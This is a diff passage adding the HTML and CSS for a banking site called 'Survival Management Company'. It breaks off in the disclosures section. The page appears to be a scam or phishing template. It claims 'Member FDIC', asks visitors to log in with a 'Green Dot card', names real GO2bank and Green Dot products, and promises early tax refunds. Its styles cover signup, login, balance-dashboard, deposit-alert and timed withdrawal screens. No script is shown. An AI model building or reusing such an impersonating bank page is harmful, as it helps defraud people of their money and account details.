@@ -1,0 +1,2235 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Survival Management Company</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap"
+        rel="stylesheet" />
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "Inter", sans-serif;
+        }
+
+        :root {
+            --bg: #07110d;
+            --text: #f4f7f5;
+            --muted: #a8b4ae;
+            --green: #7df04a;
+            --green-2: #32d74b;
+            --white: #fff;
+            --shadow: 0 20px 50px rgba(0, 0, 0, .2);
+            --dashboard-bg: linear-gradient(180deg, #edf3ef 0%, #eef3f0 100%);
+            --gold-1: #c89d45;
+            --gold-2: #ddb767;
+            --max: 1240px;
+        }
+
+        html,
+        body {
+            overflow-x: hidden;
+            scroll-behavior: smooth;
+        }
+
+        body {
+            color: var(--text);
+            background:
+                radial-gradient(circle at top left, rgba(50, 215, 75, .18), transparent 24%),
+                radial-gradient(circle at 88% 10%, rgba(125, 240, 74, .12), transparent 18%),
+                linear-gradient(180deg, #050907 0%, #07110d 40%, #0c1612 100%);
+        }
+
+        button {
+            border: none;
+            cursor: pointer;
+        }
+
+        a {
+            color: inherit;
+            text-decoration: none;
+        }
+
+        .header {
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            backdrop-filter: blur(18px);
+            background: rgba(5, 10, 8, .72);
+            border-bottom: 1px solid rgba(255, 255, 255, .05);
+            transition: box-shadow .3s ease;
+        }
+
+        .top-banner {
+            text-align: center;
+            padding: .85rem 1rem;
+            font-size: clamp(.8rem, 2vw, .95rem);
+            color: #dce8e1;
+            background: linear-gradient(90deg, rgba(255, 255, 255, .03), rgba(125, 240, 74, .07), rgba(255, 255, 255, .03));
+        }
+
+        .top-banner a {
+            text-decoration: underline;
+            font-weight: 600;
+        }
+
+        .navbar-wrap,
+        .hero,
+        .section-inner,
+        .dashboard-shell {
+            max-width: var(--max);
+            margin: 0 auto;
+            padding-left: 1.1rem;
+            padding-right: 1.1rem;
+        }
+
+        .navbar-wrap {
+            padding-top: 1rem;
+            padding-bottom: 1rem;
+        }
+
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 1rem;
+        }
+
+        .hamburger {
+            width: 24px;
+            height: 18px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .hamburger span {
+            height: 2px;
+            border-radius: 999px;
+            background: #fff;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: .75rem;
+            min-width: 0;
+        }
+
+        .logo-dot,
+        .dash-dot {
+            width: 14px;
+            height: 14px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--green), var(--green-2));
+            box-shadow: 0 0 16px rgba(125, 240, 74, .45);
+            flex-shrink: 0;
+        }
+
+        .logo-text {
+            font-size: clamp(.95rem, 2vw, 1.08rem);
+            font-weight: 700;
+            line-height: 1.2;
+        }
+
+        .open-btn,
+        .primary-btn,
+        .auth-btn,
+        .step-btn,
+        .detail-close,
+        .notice-btn,
+        .withdraw-close {
+            border-radius: 999px;
+            font-weight: 700;
+            transition: transform .2s ease, opacity .2s ease;
+        }
+
+        .open-btn:hover,
+        .primary-btn:hover,
+        .auth-btn:hover,
+        .step-btn:hover,
+        .detail-close:hover,
+        .notice-btn:hover,
+        .withdraw-close:hover {
+            transform: translateY(-1px);
+        }
+
+        .open-btn {
+            background: #fff;
+            color: #0a110d;
+            padding: .8rem 1.1rem;
+            font-size: .9rem;
+            white-space: nowrap;
+        }
+
+        .hero {
+            padding-top: 2rem;
+            padding-bottom: 4rem;
+        }
+
+        .hero-grid {
+            display: grid;
+            grid-template-columns: 1.15fr .85fr;
+            gap: 2rem;
+            align-items: center;
+            min-height: 70vh;
+        }
+
+        .eyebrow {
+            display: inline-flex;
+            align-items: center;
+            gap: .6rem;
+            padding: .55rem .9rem;
+            border: 1px solid rgba(255, 255, 255, .09);
+            border-radius: 999px;
+            color: #d9e4de;
+            background: rgba(255, 255, 255, .03);
+            font-size: .88rem;
+            margin-bottom: 1.25rem;
+        }
+
+        .eyebrow::before {
+            content: "";
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--green);
+            box-shadow: 0 0 16px rgba(125, 240, 74, .55);
+        }
+
+        .title-small {
+            color: #d1ddd6;
+            font-size: clamp(1rem, 2vw, 1.1rem);
+            margin-bottom: .9rem;
+        }
+
+        .title-big {
+            font-size: clamp(2.4rem, 7vw, 5.1rem);
+            line-height: .96;
+            font-weight: 800;
+            letter-spacing: -.045em;
+        }
+
+        .title-big .accent {
+            color: var(--green);
+        }
+
+        .subtitle {
+            margin-top: 1.3rem;
+            color: var(--muted);
+            font-size: clamp(1rem, 2vw, 1.12rem);
+            line-height: 1.75;
+            max-width: 620px;
+        }
+
+        .hero-actions {
+            margin-top: 1.8rem;
+            display: flex;
+            flex-wrap: wrap;
+            gap: .9rem;
+        }
+
+        .primary-btn {
+            background: linear-gradient(135deg, var(--green), #99f76d);
+            color: #08110c;
+            padding: 1rem 1.35rem;
+            box-shadow: 0 14px 30px rgba(125, 240, 74, .18);
+        }
+
+        .hero-card {
+            background:
+                radial-gradient(circle at top right, rgba(125, 240, 74, .12), transparent 28%),
+                linear-gradient(180deg, rgba(17, 27, 23, .96), rgba(9, 15, 12, .94));
+            border: 1px solid rgba(255, 255, 255, .08);
+            border-radius: 30px;
+            padding: 2rem;
+            min-height: 420px;
+            box-shadow: var(--shadow);
+            display: grid;
+            place-items: center;
+            text-align: center;
+        }
+
+        .hero-card h3 {
+            font-size: clamp(1.5rem, 3vw, 2rem);
+            margin-bottom: .8rem;
+        }
+
+        .hero-card p {
+            color: var(--muted);
+            line-height: 1.7;
+            max-width: 340px;
+        }
+
+        .info-section,
+        .feature-band {
+            position: relative;
+            z-index: 1;
+        }
+
+        .info-section {
+            padding-bottom: 2rem;
+        }
+
+        .cta-large {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 1.3rem;
+        }
+
+        .cta-large .primary-btn {
+            width: min(100%, 760px);
+            font-size: clamp(1rem, 2vw, 1.18rem);
+            padding: 1.15rem 1.4rem;
+        }
+
+        .existing {
+            text-align: center;
+            margin-top: 1rem;
+        }
+
+        .existing p {
+            color: #d0dbd5;
+            font-size: 1rem;
+        }
+
+        .existing a {
+            display: inline-block;
+            margin-top: .5rem;
+            color: var(--green);
+            text-decoration: underline;
+            font-weight: 600;
+        }
+
+        .description {
+            margin-top: 2rem;
+            color: #d9e3dd;
+            font-size: clamp(1rem, 2vw, 1.14rem);
+            line-height: 1.8;
+            max-width: 760px;
+        }
+
+        .divider {
+            height: 1px;
+            background: rgba(255, 255, 255, .08);
+            margin: 1.75rem 0;
+        }
+
+        .accordion {
+            display: grid;
+            gap: .85rem;
+        }
+
+        .row {
+            display: flex;
+            justify-content: space-between;
+            gap: 1rem;
+            align-items: center;
+            padding: 1.2rem;
+            border-radius: 18px;
+            background: rgba(255, 255, 255, .03);
+            border: 1px solid rgba(255, 255, 255, .06);
+            font-size: clamp(1rem, 2vw, 1.16rem);
+        }
+
+        .feature-band {
+            padding: 2rem 0 4.5rem;
+        }
+
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(2, minmax(0, 1fr));
+            gap: 1.2rem;
+        }
+
+        .feature-panel {
+            background: linear-gradient(180deg, rgba(17, 27, 23, .9), rgba(11, 18, 15, .92));
+            border: 1px solid rgba(255, 255, 255, .06);
+            border-radius: 28px;
+            padding: 1.6rem;
+            min-height: 240px;
+            box-shadow: var(--shadow);
+        }
+
+        .feature-icon {
+            width: 52px;
+            height: 52px;
+            border-radius: 16px;
+            display: grid;
+            place-items: center;
+            margin-bottom: 1rem;
+            background: linear-gradient(135deg, rgba(125, 240, 74, .22), rgba(255, 255, 255, .05));
+            font-size: 1.3rem;
+        }
+
+        .feature-title {
+            font-size: clamp(1.2rem, 2vw, 1.45rem);
+            font-weight: 700;
+            margin-bottom: .7rem;
+        }
+
+        .feature-text {
+            color: #b9c5bf;
+            line-height: 1.72;
+        }
+
+        .legal-note {
+            margin-top: 1.8rem;
+            font-size: .84rem;
+            color: #93a09a;
+            line-height: 1.85;
+            background: rgba(255, 255, 255, .03);
+            border: 1px solid rgba(255, 255, 255, .05);
+            padding: 1.2rem;
+            border-radius: 20px;
+        }
+
+        .modal,
+        .popup-overlay,
+        .txn-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(2, 6, 4, .78);
+            backdrop-filter: blur(18px);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 7000;
+            padding: 1rem;
+        }
+
+        .modal-box,
+        .popup-box,
+        .txn-box {
+            width: min(100%, 520px);
+            background: linear-gradient(180deg, rgba(17, 28, 23, .98), rgba(10, 17, 14, .98));
+            border: 1px solid rgba(255, 255, 255, .07);
+            border-radius: 30px;
+            box-shadow: var(--shadow);
+            padding: 1.6rem 1.2rem;
+            color: #fff;
+        }
+
+        .modal-box h2,
+        .popup-box h3,
+        .txn-box h3 {
+            font-size: clamp(1.4rem, 4vw, 1.95rem);
+            margin-bottom: .6rem;
+        }
+
+        .modal-sub,
+        .popup-text,
+        .txn-sub {
+            color: #b5c1bb;
+            line-height: 1.65;
+            font-size: .95rem;
+        }
+
+        .stepper {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: .6rem;
+            margin: 1.2rem 0 1.4rem;
+        }
+
+        .step {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: .45rem;
+        }
+
+        .step-circle {
+            width: 38px;
+            height: 38px;
+            border-radius: 50%;
+            border: 1px solid rgba(255, 255, 255, .1);
+            display: grid;
+            place-items: center;
+            background: rgba(255, 255, 255, .05);
+            color: #9db0a7;
+            font-weight: 700;
+        }
+
+        .step-label {
+            font-size: .74rem;
+            color: #8ea198;
+            text-align: center;
+        }
+
+        .step.active .step-circle,
+        .step.done .step-circle {
+            background: linear-gradient(135deg, var(--green), #9cf76f);
+            color: #08100c;
+            border-color: transparent;
+        }
+
+        .step.active .step-label,
+        .step.done .step-label {
+            color: #e6f7eb;
+        }
+
+        .form-step {
+            display: none;
+        }
+
+        .form-step.active {
+            display: block;
+        }
+
+        .input-grid {
+            display: grid;
+            grid-template-columns: repeat(2, minmax(0, 1fr));
+            gap: .85rem;
+            margin-top: 1rem;
+        }
+
+        .full {
+            grid-column: 1 / -1;
+        }
+
+        .modal-box input {
+            width: 100%;
+            border: 1px solid rgba(255, 255, 255, .08);
+            background: rgba(255, 255, 255, .04);
+            color: #fff;
+            border-radius: 16px;
+            padding: .95rem 1rem;
+            outline: none;
+            font-size: .96rem;
+        }
+
+        .modal-box input::placeholder {
+            color: #90a099;
+        }
+
+        .step-actions {
+            display: flex;
+            justify-content: space-between;
+            gap: .8rem;
+            margin-top: 1.2rem;
+        }
+
+        .step-btn,
+        .auth-btn {
+            padding: .95rem 1.15rem;
+            width: 100%;
+        }
+
+        .step-btn {
+            background: rgba(255, 255, 255, .07);
+            color: #fff;
+            border: 1px solid rgba(255, 255, 255, .08);
+        }
+
+        .auth-btn {
+            background: linear-gradient(135deg, var(--green), #95f76c);
+            color: #08100c;
+            box-shadow: 0 16px 32px rgba(125, 240, 74, .2);
+        }
+
+        .switch {
+            margin-top: 1rem;
+            color: #9fb0a8;
+            font-size: .95rem;
+            text-align: center;
+        }
+
+        .switch a {
+            color: var(--green);
+            text-decoration: underline;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .mock-code {
+            margin-top: 1rem;
+            padding: .95rem 1rem;
+            border-radius: 18px;
+            background: rgba(255, 255, 255, .05);
+            border: 1px solid rgba(255, 255, 255, .07);
+            color: #dff4e6;
+            line-height: 1.7;
+            font-size: .92rem;
+        }
+
+        .inline-error {
+            margin-top: .8rem;
+            color: #ffb4b4;
+            font-size: .9rem;
+            min-height: 1.2rem;
+        }
+
+        #depositAlert {
+            position: fixed;
+            top: -160px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: min(92vw, 430px);
+            background: linear-gradient(180deg, rgba(18, 28, 24, .98), rgba(11, 18, 15, .98));
+            color: #fff;
+            border: 1px solid rgba(255, 255, 255, .08);
+            border-radius: 22px;
+            box-shadow: 0 24px 60px rgba(0, 0, 0, .28);
+            padding: 1rem;
+            z-index: 6000;
+            transition: top .6s ease;
+        }
+
+        .alert-title {
+            display: flex;
+            justify-content: space-between;
+            gap: 1rem;
+            align-items: center;
+            margin-bottom: .55rem;
+        }
+
+        .alert-badge {
+            font-size: .82rem;
+            font-weight: 700;
+            color: #dcf7e4;
+            background: rgba(125, 240, 74, .11);
+            border: 1px solid rgba(125, 240, 74, .16);
+            padding: .45rem .7rem;
+            border-radius: 999px;
+        }
+
+        .alert-body {
+            color: #d7e2dc;
+            font-size: .95rem;
+            line-height: 1.65;
+        }
+
+        #dashboard {
+            display: none;
+            position: fixed;
+            inset: 0;
+            overflow-y: auto;
+            background: var(--dashboard-bg);
+            color: #111;
+            z-index: 5000;
+            padding-bottom: 110px;
+        }
+
+        .dashboard-shell {
+            padding-top: 1rem;
+            padding-bottom: 1rem;
+        }
+
+        .dash-header {
+            position: sticky;
+            top: 0;
+            z-index: 10;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 1rem;
+            padding: 1rem .2rem;
+            background: rgba(238, 243, 240, .9);
+            backdrop-filter: blur(18px);
+        }
+
+        .dash-logo {
+            display: flex;
+            align-items: center;
+            gap: .8rem;
+            font-weight: 800;
+            color: #102019;
+            font-size: clamp(1rem, 2vw, 1.1rem);
+        }
+
+        .logout-btn {
+            padding: .78rem 1rem;
+            border-radius: 999px;
+            background: #fff;
+            border: 1px solid rgba(17, 17, 17, .06);
+            color: #24332d;
+            font-size: .92rem;
+            font-weight: 700;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, .05);
+            cursor: pointer;
+        }
+
+        .dashboard-grid {
+            display: grid;
+            grid-template-columns: 1.2fr .8fr;
+            gap: 1.2rem;
+            align-items: start;
+            padding-bottom: 1rem;
+        }
+
+        .stack {
+            display: grid;
+            gap: 1.2rem;
+            min-width: 0;
+        }
+
+        .panel {
+            background: rgba(255, 255, 255, .9);
+            border: 1px solid rgba(17, 17, 17, .05);
+            box-shadow: 0 16px 36px rgba(20, 36, 30, .08);
+            border-radius: 28px;
+            overflow: hidden;
+            min-width: 0;
+        }
+
+        .hero-account {
+            background:
+                radial-gradient(circle at top right, rgba(125, 240, 74, .18), transparent 24%),
+                linear-gradient(135deg, #102019 0%, #172b22 55%, #101a15 100%);
+            color: #fff;
+            padding: 1.6rem;
+        }
+
+        .welcome-box {
+            display: inline-flex;
+            align-items: center;
+            gap: .7rem;
+            border-radius: 999px;
+            background: rgba(255, 255, 255, .08);
+            border: 1px solid rgba(255, 255, 255, .08);
+            color: #eef6f1;
+            padding: .7rem 1rem;
+            font-size: .95rem;
+            margin-bottom: 1rem;
+        }
+
+        .account-title {
+            font-size: clamp(1.7rem, 4vw, 2.6rem);
+            font-weight: 800;
+            letter-spacing: -.03em;
+            max-width: 560px;
+        }
+
+        .account-subtitle {
+            margin-top: .85rem;
+            color: #bed1c7;
+            line-height: 1.75;
+            max-width: 560px;
+            font-size: 1rem;
+        }
+
+        .balance-band {
+            margin-top: 1.35rem;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1rem;
+        }
+
+        .balance-card {
+            flex: 1 1 340px;
+            min-width: 0;
+            background: rgba(255, 255, 255, .07);
+            border: 1px solid rgba(255, 255, 255, .08);
+            border-radius: 24px;
+            padding: 1.15rem;
+        }
+
+        .balance-top {
+            display: flex;
+            justify-content: space-between;
+            gap: 1rem;
+            align-items: center;
+        }
+
+        .balance-title {
+            color: #c9d8d1;
+            font-size: .92rem;
+        }
+
+        .eye-btn {
+            width: 38px;
+            height: 38px;
+            display: grid;
+            place-items: center;
+            border-radius: 12px;
+            background: rgba(255, 255, 255, .08);
+            border: 1px solid rgba(255, 255, 255, .08);
+            color: #fff;
+            cursor: pointer;
+        }
+
+        .balance-amount {
+            margin-top: .7rem;
+            font-size: clamp(2rem, 5vw, 3.4rem);
+            font-weight: 800;
+            letter-spacing: -.04em;
+            line-height: 1;
+            word-break: break-word;
+        }
+
+        .balance-sub {
+            margin-top: .45rem;
+            color: #c4d4cc;
+            font-size: .95rem;
+        }
+
+        .action-row {
+            margin-top: 1rem;
+            display: grid;
+            grid-template-columns: repeat(3, minmax(0, 1fr));
+            gap: .8rem;
+        }
+
+        .action-item {
+            background: rgba(255, 255, 255, .08);
+            border: 1px solid rgba(255, 255, 255, .08);
+            border-radius: 18px;
+            padding: .9rem .6rem;
+            text-align: center;
+            color: #eef6f1;
+            cursor: pointer;
+        }
+
+        .action-icon {
+            font-size: 1.3rem;
+            margin-bottom: .4rem;
+        }
+
+        .action-label {
+            font-size: .9rem;
+            font-weight: 700;
+        }
+
+        .visa-card {
+            padding: 1.3rem;
+            background: linear-gradient(135deg, var(--gold-1) 0%, var(--gold-2) 45%, #bd9140 100%);
+            color: #fff;
+            border-radius: 28px;
+            min-height: 260px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            box-shadow: inset 0 1px 0 rgba(255, 255, 255, .22);
+        }
+
+        .visa-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 1rem;
+            font-size: .95rem;
+            font-weight: 700;
+        }
+
+        .visa-middle {
+            font-size: 1.05rem;
+            line-height: 1.65;
+            max-width: 300px;
+        }
+
+        .visa-bottom {
+            display: flex;
+            justify-content: space-between;
+            align-items: end;
+            gap: 1rem;
+            flex-wrap: wrap;
+        }
+
+        .card-number {
+            font-size: clamp(1rem, 3vw, 1.15rem);
+            letter-spacing: .18em;
+            font-weight: 700;
+            word-break: break-word;
+        }
+
+        .panel-head {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 1rem;
+            padding: 1.2rem 1.25rem 0;
+            flex-wrap: wrap;
+        }
+
+        .panel-title {
+            font-size: 1.2rem;
+            font-weight: 800;
+            color: #12211b;
+        }
+
+        .panel-link {
+            color: #2d6a43;
+            font-weight: 700;
+            font-size: .92rem;
+            cursor: pointer;
+        }
+
+        .transaction-list {
+            padding: 1rem 1.25rem 1.25rem;
+            display: grid;
+            gap: .9rem;
+            width: 100%;
+        }
+
+        .tx {
+            display: flex;
+            justify-content: space-between;
+            gap: 1rem;
+            align-items: center;
+            background: #f7faf8;
+            border: 1px solid rgba(17, 17, 17, .05);
+            border-radius: 18px;
+            padding: 1rem;
+            width: 100%;
+            min-width: 0;
+            flex-wrap: wrap;
+            cursor: pointer;
+        }
+
+        .tx-left {
+            display: flex;
+            align-items: center;
+            gap: .9rem;
+            min-width: 0;
+            flex: 1 1 220px;
+        }
+
+        .tx-icon {
+            width: 46px;
+            height: 46px;
+            border-radius: 14px;
+            display: grid;
+            place-items: center;
+            background: linear-gradient(135deg, rgba(125, 240, 74, .2), rgba(50, 215, 75, .1));
+            color: #205236;
+            font-size: 1.1rem;
+            flex-shrink: 0;
+        }
+
+        .tx-copy {
+            min-width: 0;
+        }
+
+        .tx-name {
+            font-weight: 700;
+            color: #14221c;
+            word-break: break-word;
+        }
+
+        .tx-meta {
+            color: #70827a;
+            font-size: .9rem;
+            margin-top: .18rem;
+            word-break: break-word;
+        }
+
+        .tx-amount {
+            font-weight: 800;
+            white-space: nowrap;
+            color: #178a47;
+            flex: 0 0 auto;
+        }
+
+        .tx-amount.negative {
+            color: #cf5e5e;
+        }
+
+        #historyPage {
+            display: none;
+            padding-bottom: 1rem;
+        }
+
+        .detail-grid {
+            display: grid;
+            gap: .85rem;
+            margin-top: 1rem;
+        }
+
+        .detail-item {
+            display: flex;
+            justify-content: space-between;
+            gap: 1rem;
+            padding: .95rem 1rem;
+            border-radius: 18px;
+            background: rgba(255, 255, 255, .04);
+            border: 1px solid rgba(255, 255, 255, .06);
+            flex-wrap: wrap;
+        }
+
+        .detail-label {
+            color: #9fb0a8;
+            font-size: .9rem;
+        }
+
+        .detail-value {
+            color: #fff;
+            font-weight: 700;
+            text-align: right;
+            word-break: break-word;
+        }
+
+        .popup-box,
+        .txn-box {
+            width: min(100%, 460px);
+        }
+
+        .popup-actions,
+        .txn-actions {
+            margin-top: 1.2rem;
+            display: flex;
+            justify-content: flex-end;
+            gap: .8rem;
+        }
+
+        .notice-btn,
+        .detail-close {
+            padding: .85rem 1.15rem;
+            background: linear-gradient(135deg, var(--green), #96f76b);
+            color: #08110c;
+        }
+
+        .withdraw-box {
+            width: min(100%, 620px);
+            padding: 0;
+            overflow: hidden;
+        }
+
+        .withdraw-head {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1.1rem 1.2rem;
+            border-bottom: 1px solid rgba(255, 255, 255, .08);
+        }
+
+        .withdraw-close {
+            width: 40px;
+            height: 40px;
+            border-radius: 12px;
+            background: rgba(255, 255, 255, .06);
+            color: #fff;
+            border: 1px solid rgba(255, 255, 255, .08);
+        }
+
+        .withdraw-card {
+            padding: 1.2rem;
+        }
+
+        .withdraw-label {
+            color: #32d74b;
+            font-size: 1.4rem;
+            font-weight: 800;
+            margin-bottom: .45rem;
+        }
+
+        .withdraw-sub {
+            color: #9fb0a8;
+            font-size: .92rem;
+            margin-bottom: 1rem;
+            line-height: 1.6;
+        }
+
+        .withdraw-stepper {
+            display: grid;
+            grid-template-columns: repeat(4, minmax(0, 1fr));
+            gap: .6rem;
+            margin-bottom: 1rem;
+        }
+
+        .w-step {
+            text-align: center;
+            font-size: .72rem;
+            color: #8ea198;
+        }
+
+        .w-step span {
+            width: 34px;
+            height: 34px;
+            border-radius: 50%;
+            display: grid;
+            place-items: center;
+            margin: 0 auto .4rem;
+            border: 1px solid rgba(255, 255, 255, .14);
+            background: rgba(255, 255, 255, .06);
+            color: #afc1b8;
+            font-weight: 700;
+        }
+
+        .w-step.active span,
+        .w-step.done span {
+            background: linear-gradient(135deg, var(--green), #98f86c);
+            color: #0a110d;
+            border-color: transparent;
+        }
+
+        .w-step.active,
+        .w-step.done {
+            color: #e4f6eb;
+        }
+
+        .withdraw-stage {
+            display: none;
+            border: 1px solid rgba(255, 255, 255, .08);
+            border-radius: 18px;
+            padding: 1rem;
+            background: rgba(255, 255, 255, .03);
+        }
+
+        .withdraw-stage.active {
+            display: block;
+        }
+
+        .withdraw-stage h4 {
+            font-size: 1.03rem;
+            margin-bottom: .6rem;
+        }
+
+        .withdraw-stage p,
+        .withdraw-stage li {
+            color: #c3cec8;
+            line-height: 1.75;
+            font-size: .95rem;
+        }
+
+        .withdraw-stage ul {
+            padding-left: 1.1rem;
+            display: grid;
+            gap: .55rem;
+            margin-bottom: .6rem;
+        }
+
+        .withdraw-input-label {
+            display: block;
+            margin: .8rem 0 .5rem;
+            font-weight: 700;
+            color: #fff;
+            font-size: .92rem;
+        }
+
+        .withdraw-input,
+        .withdraw-select {
+            width: 100%;
+            border: 1px solid rgba(255, 255, 255, .15);
+            background: rgba(255, 255, 255, .04);
+            color: #fff;
+            border-radius: 14px;
+            padding: .9rem .95rem;
+            outline: none;
+            font-size: .95rem;
+        }
+
+        .withdraw-select option {
+            color: #111;
+        }
+
+        .withdraw-submit {
+            margin-top: .85rem;
+            width: 100%;
+        }
+
+        .withdraw-row {
+            margin-top: .8rem;
+            display: grid;
+            grid-template-columns: repeat(2, minmax(0, 1fr));
+            gap: .75rem;
+        }
+
+        .withdraw-chip {
+            border: 1px solid rgba(255, 255, 255, .1);
+            background: rgba(255, 255, 255, .04);
+            border-radius: 12px;
+            padding: .65rem .7rem;
+            color: #d8e4dd;
+            font-size: .88rem;
+        }
+
+        .withdraw-inline {
+            min-height: 1.1rem;
+            margin-top: .65rem;
+            color: #d8e4dd;
+            font-size: .9rem;
+        }
+
+        .withdraw-inline.error {
+            color: #ffb3b3;
+        }
+
+        .withdraw-timer {
+            margin-top: .35rem;
+            color: #7df04a;
+            font-weight: 700;
+            font-size: .92rem;
+        }
+
+        .withdraw-actions {
+            margin-top: .9rem;
+            display: flex;
+            gap: .7rem;
+            flex-wrap: wrap;
+        }
+
+        .withdraw-secondary {
+            flex: 1;
+            border-radius: 14px;
+            border: 1px solid rgba(255, 255, 255, .14);
+            background: rgba(255, 255, 255, .04);
+            color: #fff;
+            padding: .78rem .85rem;
+            font-weight: 700;
+        }
+
+        .withdraw-primary {
+            flex: 1.2;
+            border-radius: 14px;
+            background: linear-gradient(135deg, var(--green), #98f86c);
+            color: #08110c;
+            padding: .78rem .85rem;
+            font-weight: 700;
+        }
+
+        .bottom-nav {
+            position: fixed;
+            left: 50%;
+            bottom: 18px;
+            transform: translateX(-50%);
+            width: min(94vw, 420px);
+            display: flex;
+            justify-content: space-around;
+            gap: .7rem;
+            padding: .7rem;
+            border-radius: 24px;
+            background: rgba(255, 255, 255, .9);
+            border: 1px solid rgba(17, 17, 17, .06);
+            box-shadow: 0 18px 44px rgba(14, 28, 22, .14);
+            backdrop-filter: blur(18px);
+            z-index: 20;
+        }
+
+        .nav-item {
+            flex: 1;
+            text-align: center;
+            border-radius: 18px;
+            padding: .8rem .5rem;
+            color: #6a7b74;
+            font-size: .9rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background .25s ease, color .25s ease;
+        }
+
+        .nav-item.active {
+            background: linear-gradient(135deg, #13231d, #1b3027);
+            color: #fff;
+        }
+
+        @media (max-width: 980px) {
+
+            .hero-grid,
+            .dashboard-grid,
+            .feature-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        @media (max-width: 720px) {
+
+            .input-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .hero-card {
+                min-height: 260px;
+            }
+        }
+
+        @media (max-width: 560px) {
+            .top-banner {
+                font-size: .78rem;
+            }
+
+            .logo-text {
+                max-width: 150px;
+            }
+
+            .modal-box,
+            .popup-box,
+            .txn-box {
+                border-radius: 24px;
+                padding: 1.3rem 1rem;
+            }
+
+            .panel,
+            .visa-card {
+                border-radius: 22px;
+            }
+
+            .bottom-nav {
+                bottom: 12px;
+                border-radius: 20px;
+            }
+
+            .tx {
+                align-items: flex-start;
+            }
+
+            .tx-amount {
+                width: 100%;
+                padding-left: 55px;
+            }
+
+            .step-label {
+                font-size: .66rem;
+            }
+
+            .withdraw-card {
+                padding: 1rem;
+            }
+
+            .withdraw-label {
+                font-size: 1.3rem;
+            }
+
+            .withdraw-row {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <header class="header" id="header">
+        <div class="top-banner">
+            EARLY REFUND: Get your tax refund up to 5 days early.
+            <a href="#">Learn more</a>
+        </div>
+
+        <div class="navbar-wrap">
+            <div class="navbar">
+                <div class="hamburger" aria-hidden="true">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </div>
+
+                <div class="logo">
+                    <div class="logo-dot"></div>
+                    <div class="logo-text">Survival Management Company</div>
+                </div>
+
+                <button class="open-btn" onclick="openSignup()">Open an account</button>
+            </div>
+        </div>
+    </header>
+
+    <main>
+        <section class="hero">
+            <div class="hero-grid">
+                <div>
+                    <div class="eyebrow">Member FDIC</div>
+                    <div class="title-small">Survival Management Unlimited</div>
+
+                    <h1 class="title-big">
+                        Get your tax refund up to <span class="accent">5 days</span> early
+                    </h1>
+
+                    <p class="subtitle">
+                        when you direct deposit it to your SMC-Wallet.
+                    </p>
+
+                    <div class="hero-actions">
+                        <button class="primary-btn" onclick="openSignup()">Open an account</button>
+                    </div>
+                </div>
+
+                <div class="hero-card">
+                    <div>
+                        <h3>Protect your money</h3>
+                        <p>
+                            with eligible direct deposits and opt-in.* We'll cover purchase transactions that exceed
+                            your available balance.
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="info-section">
+            <div class="section-inner">
+                <div class="cta-large">
+                    <button class="primary-btn" onclick="openSignup()">Open an account</button>
+                </div>
+
+                <div class="existing">
+                    <p>Already have a Green Dot card?</p>
+                    <a href="#" onclick="showLogin()">Login here</a>
+                </div>
+
+                <div class="description">
+                    Get your pay up to 2 days early with direct deposit and your government benefits up to 4 days
+                    early.*
+
+
+                </div>
+
+                <div class="divider"></div>
+
+                <div class="accordion">
+                    <div class="row">
+                        <span>GO2bank, the ultimate mobile bank account</span>
+                        <span>+</span>
+                    </div>
+
+                    <div class="row">
+                        <span>Green Dot Unlimited Cash Back Bank Account</span>
+                        <span>+</span>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="feature-band">
+            <div class="section-inner">
+                <div class="feature-grid">
+                    <div class="feature-panel">
+                        <div class="feature-icon">💲</div>
+                        <div class="feature-title">Mobile banking</div>
+                        <div class="feature-text">
+                            Mobile check cashing & deposit, online bill pay and track your spending 24/7.
+                        </div>
+                    </div>
+
+                    <div class="feature-panel">
+                        <div class="feature-icon">💳</div>
+                        <div class="feature-title">Add money easily</div>
+                        <div class="feature-text">
+                            Bank transfer,* cash or deposit checks,* or add cash using the app.*
+                        </div>
+                    </div>
+
+                    <div class="feature-panel">
+                        <div class="feature-icon">🐷</div>
+                        <div class="feature-title">Savings features</div>
+                        <div class="feature-text">
+                            Set aside money in the Money Vault* or High-Yield Savings Account* for free and access
+                            anytime.
+                        </div>
+                    </div>
+
+                    <div class="feature-panel">
+                        <div class="feature-icon">🛡️</div>
+                        <div class="feature-title">Account protection</div>
+                        <div class="feature-text">
+                            Lock / unlock your card*, account alerts* & a chip-enabled card!
+                        </div>
+                    </div>
+                </div>
+
+                <div class="legal-note">
+                    *When on a desktop, hover over * to view important disclosures. When on a mobile
